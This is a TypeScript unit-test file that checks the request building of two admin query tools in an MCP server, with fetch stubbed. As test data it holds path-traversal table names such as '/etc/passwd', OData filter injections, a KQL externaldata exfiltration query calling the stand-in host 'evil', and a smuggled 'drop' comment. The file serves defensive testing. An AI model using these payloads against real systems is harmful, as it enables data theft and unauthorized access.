/**
 * Adversarial UNIT tests for the Global-Admin raw tools (query_table, query_backend_logs).
 *
 * The existing tools-raw.test.ts is a live-backend integration suite gated behind
 * `describe.skipIf(!AUTOPILOT_API_TOKEN)` — so in CI (no token) it goes green without
 * exercising anything. These tests fill that gap at the unit level: fetch is stubbed, so
 * they ALWAYS run in CI and prove the request the tool *builds* is safe:
 *
 *   - `tableName` is encodeURIComponent'd → path-traversal is contained to one path segment.
 *   - `continuation` cross-tool path substitution is rejected by followNextLink's base-path guard.
 *   - operator-supplied OData `filter` / KQL `query` are forwarded VERBATIM (documenting the
 *     trust boundary: sanitization + RBAC live on the backend, GlobalAdmin-only). These tests
 *     pin that forwarding so a regression that silently mangles or drops the payload is caught,
 *     and so the "no client-side length cap" behavior is explicit rather than accidental.
 *
 * Harness mirrors tools-delegated.test.ts: build a server for a strict-GA caller, pull the raw
 * registered handler, stub global fetch, invoke inside runWithCaller, inspect url + body.
 */
import { describe, it, expect, vi, afterEach } from 'vitest';
import { McpServer } from '@modelcontextprotocol/sdk/server/mcp.js';
import { registerTools } from '../tools.js';
import { runWithCaller } from '../client.js';

type ToolHandler = (args: Record<string, unknown>, extra: unknown) => Promise<{
  content?: Array<{ type: string; text?: string }>;
  isError?: boolean;
}>;

/** Build a strict-GA server and return a tool's raw handler by name. */
function gaHandler(name: string): ToolHandler {
  const server = new McpServer({ name: 'test', version: '0.0.0' });
  registerTools(server, undefined, undefined, undefined, [], /*ga*/ true, /*strictGa*/ true, /*delegated*/ false);
  const registry = (server as unknown as { _registeredTools: Record<string, { handler: ToolHandler }> })._registeredTools;
  const tool = registry[name];
  if (!tool) throw new Error(`tool ${name} not registered for strict-GA caller`);
  return tool.handler;
}

interface Captured { url: string; method: string; body: string | undefined; }

/** Stub global fetch; capture url + method + body, return an empty-OK JSON body. */
function stubFetchCapture(): { calls: Captured[] } {
  const calls: Captured[] = [];
  const fn = vi.fn(async (url: string, init?: RequestInit) => {
    calls.push({
      url: String(url),
      method: (init?.method ?? 'GET').toUpperCase(),
      body: typeof init?.body === 'string' ? init.body : undefined,
    });
    return {
      ok: true,
      status: 200,
      json: async () => ({ table: 'X', count: 0, entities: [], tables: [], nextLink: null }),
      text: async () => '{}',
    } as unknown as Response;
  });
  vi.stubGlobal('fetch', fn);
  return { calls };
}

function resultText(r: { content?: Array<{ text?: string }> }): string {
  return (r.content ?? []).map((c) => c.text ?? '').join('\n');
}

const GA = { token: 'ga-token', isGlobalAdmin: true } as const;
const extra = { signal: new AbortController().signal };

afterEach(() => vi.unstubAllGlobals());

// ── query_table: table-name path-traversal containment ──────────────────────
describe('query_table — tableName path-traversal is contained by encodeURIComponent', () => {
  const traversals: Array<[label: string, tableName: string]> = [
    ['parent-dir slashes', 'Sessions/../../admin/secrets'],
    ['leading slash', '/etc/passwd'],
    ['encoded slash', 'Sessions..%2F..%2Fadmin'],
    ['backslash', 'Sessions\\..\\admin'],
    ['dot segments only', '../../../'],
  ];

  it.each(traversals)('%s stays within the /raw/tables/ segment', async (_label, tableName) => {
    const handler = gaHandler('query_table');
    const { calls } = stubFetchCapture();

    await runWithCaller(GA, () => handler({ tableName }, extra));

    expect(calls).toHaveLength(1);
    const url = calls[0].url;
    // The request targets the tables endpoint...
    expect(url).toContain('/api/global/raw/tables/');
    // ...and the table name is a single, fully-encoded path segment: no raw '/'
    // (and no raw '\\') survives between the base and the query string, so the
    // caller cannot pivot to a sibling/parent path like /admin/secrets.
    const afterBase = url.split('/api/global/raw/tables/')[1] ?? '';
    const segment = afterBase.split('?')[0];
    expect(segment).not.toContain('/');
    expect(segment).not.toContain('\\');
  });
});

// ── query_table: continuation cross-tool path substitution guard ────────────
describe('query_table — crafted continuation cannot bend the request to another endpoint', () => {
  const foreign: Array<[label: string, continuation: string]> = [
    ['other tool path', '/api/global/raw/logs?x=1'],
    ['admin path', '/api/admin/secrets'],
    ['different table id', '/api/global/raw/tables/OtherTable?pageSize=1'],
  ];

  it.each(foreign)('rejects continuation pointing at %s', async (_label, continuation) => {
    const handler = gaHandler('query_table');
    const { calls } = stubFetchCapture();

    const res = await runWithCaller(GA, () => handler({ tableName: 'Sessions', continuation }, extra));

    // followNextLink throws on base-path mismatch; toolError turns it into an isError result
    // WITHOUT ever issuing the substituted request.
    expect(calls).toHaveLength(0);
    expect(res.isError).toBe(true);
    expect(resultText(res)).toMatch(/does not match|base path/i);
  });

  it('accepts a continuation that matches its OWN base path', async () => {
    const handler = gaHandler('query_table');
    const { calls } = stubFetchCapture();
    const ownLink = '/api/global/raw/tables/Sessions?pageSize=200&continuation=abc';

    await runWithCaller(GA, () => handler({ tableName: 'Sessions', continuation: ownLink }, extra));

    expect(calls).toHaveLength(1);
    expect(calls[0].url).toContain(ownLink);
  });
});

// ── query_table: OData filter is forwarded verbatim (trust boundary) ─────────
describe('query_table — OData filter forwarded verbatim and URL-safely encoded', () => {
  const filters: Array<[label: string, filter: string]> = [
    ['tenant-scope breakout', "PartitionKey ne '' or true"],
    ['quote injection', "Status eq 'x' or 1 eq 1"],
    ['url-breaking chars', "Status eq 'a&b=c#d?e'"],
    ['unicode', "Name eq 'Ünîçodè-⚡-名前'"],
  ];

  it.each(filters)('%s round-trips through the filter param', async (_label, filter) => {
    const handler = gaHandler('query_table');
    const { calls } = stubFetchCapture();

    await runWithCaller(GA, () => handler({ tableName: 'Sessions', filter }, extra));

    expect(calls).toHaveLength(1);
    const parsed = new URL(calls[0].url, 'https://base.invalid');
    // Encoded on the wire (no structural break), decoded value is exactly what we sent.
    expect(parsed.searchParams.get('filter')).toBe(filter);
  });
});

// ── query_backend_logs: KQL forwarded verbatim over POST ────────────────────
describe('query_backend_logs — KQL forwarded verbatim in POST body (backend is the gate)', () => {
  const queries: Array<[label: string, query: string]> = [
    ['externaldata exfil attempt', "externaldata(x:string)[@'https://evil/e.csv'] with (format='csv')"],
    ['cross-table join', 'traces | join (requests) on operation_Id'],
    ['comment/terminator smuggling', "traces | take 1 // ; drop"],
    ['unicode + newlines', 'traces\n| where message has "Ünî"\n| take 1'],
  ];

  it.each(queries)('%s reaches /raw/logs unchanged', async (_label, query) => {
    const handler = gaHandler('query_backend_logs');
    const { calls } = stubFetchCapture();

    await runWithCaller(GA, () => handler({ query }, extra));

    expect(calls).toHaveLength(1);
    expect(calls[0].method).toBe('POST');
    expect(calls[0].url).toContain('/api/global/raw/logs');
    const sent = JSON.parse(calls[0].body ?? '{}');
    expect(sent.query).toBe(query);
    // (The PT1H timespan default is applied by the zod inputSchema at the MCP framework
    // boundary, not inside the raw handler, so it is asserted separately below.)
  });

  // NOTE (hardening gap): there is NO client-side length cap on `query`. This test pins the
  // current behavior — an oversized KQL string is forwarded intact — so any future cap is a
  // deliberate, tested change rather than a silent one. The real DoS gate is backend RBAC
  // (GlobalAdmin-only) + App Insights query limits.
  it('forwards an oversized KQL string without client-side truncation', async () => {
    const handler = gaHandler('query_backend_logs');
    const { calls } = stubFetchCapture();
    const huge = 'traces | where message contains "' + 'A'.repeat(100_000) + '" | take 1';

    await runWithCaller(GA, () => handler({ query: huge }, extra));

    expect(calls).toHaveLength(1);
    const sent = JSON.parse(calls[0].body ?? '{}');
    expect(sent.query.length).toBe(huge.length);
  });

  it('honors an explicit timespan', async () => {
    const handler = gaHandler('query_backend_logs');
    const { calls } = stubFetchCapture();

    await runWithCaller(GA, () => handler({ query: 'traces | take 1', timespan: 'P1D' }, extra));

    const sent = JSON.parse(calls[0].body ?? '{}');
    expect(sent.timespan).toBe('P1D');
  });
});
